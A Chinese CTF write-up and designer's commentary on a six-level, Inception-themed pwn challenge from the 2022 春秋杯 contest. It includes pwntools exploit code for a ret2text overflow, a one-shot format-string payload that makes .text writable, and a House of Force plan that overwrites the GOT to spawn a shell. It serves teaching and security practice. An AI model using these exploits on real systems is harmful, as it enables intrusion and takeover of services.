---
title: 【WP】春秋杯秋季赛 "PWN 梦空间" 设计思路与解析
contest: 春秋杯
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags: [盗梦空间-剧情, 6层梦境, city-linux-cmd, hotel-ret2text, snow-fmt-text-RWX, home-UAF, world-house-of-force, final-hidden-file]
attack_chain: 6 层梦境 city→hotel→snow→home→world→final/city linux 命令 + hotel 0x38 padding + p64(0x4006B6) 跳 backdoor + snow 一次 fmt 写 .text RWX + home UAF + world 改 top chunk -1 + house of force 把 top chunk 迁到 got 区 + free.got=puts-ret gadget 泄 libc + 改 free=system
key_payload: hotel_backdoor = 0x4006B6  snow %1515c%43$n  world house of force got 区域
one_liner: 春秋杯秋季赛 PWN 梦空间 6 层梦境关卡设计稿，盗梦空间 + 神秘博士剧情融合，覆盖 ret2text/格式化字符串/UAF/house of force 多种 PWN 技巧。
lesson: 6 层关卡设计覆盖栈溢出 / fmt 写 .text 段 / UAF / House of Force 全 PWN 攻击面；.text 段 RWX 是绕过 NX 的方法；House of Force 把 top chunk 迁到 got 区是经典劫持路线。
quality: high
---

# 【WP】春秋杯秋季赛 "PWN 梦空间" 设计思路与解析

## 题目设计
"深入梦境，你会发现，一切事物都在不断循环，随着梦境的加深，时间也变得缓慢。"

## 6 层关卡
1. **city**: linux 命令使用
2. **hotel**: 栈溢出，ret2text
3. **snow**: 格式化字符串，任意地址写，.text 段 RWX
4. **home**: UAF
5. **world**: House of force
6. **final**: 隐藏文件分析

## 剧情
"旅馆中有一个名为'栈'的前台... 当你'垂头丧气'之时，'栈'突然崩溃冒烟，他竟然是一个机器人。"

"在你拿到通行证的那一刻，旅馆中突然下起大雪... 你只有一次格式化字符串的机会，能刻的字符数非常少。"

"获取权限的刹那，走廊四周悬空，你来到了里世界中 'gamma world' 中... 你要凭借自己的能力走出这里。"

## EXP

### hotel: ret2text
```python
hotel_backdoor = 0x4006B6
sla('you?n', b'a'*0x38 + p64(hotel_backdoor))
sla('you!', './next')
```

### snow: 格式化字符串
```python
sla('you?n', '%1515c%43$naaaa')
sla('you!', './next')
```
- 一次 fmt 写 .text 段 RWX（gcc 优化去掉了 vuln 函数，但 .text 段可写）
- 利用：直接修改 .text 段函数为 shellcode

### world: House of Force
1. 覆盖 top chunk，修改为 -1
2. 将大部分 got 表中的函数都执行一次，以便写入真实地址
3. 使用 house of force，将 top chunk 迁移到 got 区域
4. 将 free.got 替换为 text 中的 puts-ret gadget，这样就可以 leak 地址了
5. 覆盖 bss 中的 create_lock，使得我们可以继续执行一次覆盖 top_chunk 的操作
6. 重新覆盖 got 中的 free 函数为 system 函数，最后触发 system('/bin/sh')

## EXP 完整代码
```python
#!/usr/bin/python3
from pwn import *

sd = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ru = lambda x: p.recvuntil(x)
rv = lambda x: p.recv(x)
io = lambda: p.interactive()
ps = lambda: pause()

context.log_level = 'debug'
i64_max = (1<<64)-1

p = remote('192.168.99.133', '10006')
libc = ELF('./libc-2.23.so')
# level 1
sla('(y/n)', 'y')
sl('./next')

# level 2
hotel_backdoor = 0x4006B6
sla('you?n', b'a'*0x38 + p64(hotel_backdoor))
sla('you!', './next')
```

## 设计者札记
"在制作 snow 题目的时候，发现代码被 gcc 自动优化了（本来 main 函数中还有一个 vuln 函数，函数中包括格式化字符串漏洞），所有的代码流程全部被集成在了 main 函数里面，这样就无法通过一次的 fmt 劫持返回地址到后门函数。本着代码能够写出来就尽量不要改动的原则，就思考能不能有其他比较好玩的解决方法，然后就有了直接修改 .text 段的这种路线"

"梦最终都是虚假的，正如梦中的生门，看起来里面有非常多的 flag... 但如果选择死门，看似毫无头绪，但是你会从中发现梦境的瑕疵点，突破永恒的梦境。"

## 经验提炼
- 6 层关卡设计覆盖栈溢出 / fmt 写 .text 段 / UAF / House of Force 全 PWN 攻击面
- .text 段 RWX 是绕过 NX 的方法（gcc 优化导致只能这样）
- House of Force 把 top chunk 迁到 got 区是经典劫持路线
- %43$n 一次 fmt 写 .text 段 RWX 位
- free.got = puts-ret gadget 是 leak 模板
- bss 中 create_lock 覆盖可继续执行
- 剧情融合盗梦空间 + 神秘博士，6 层关卡递进
- 设计者原则：尽量不改动源码
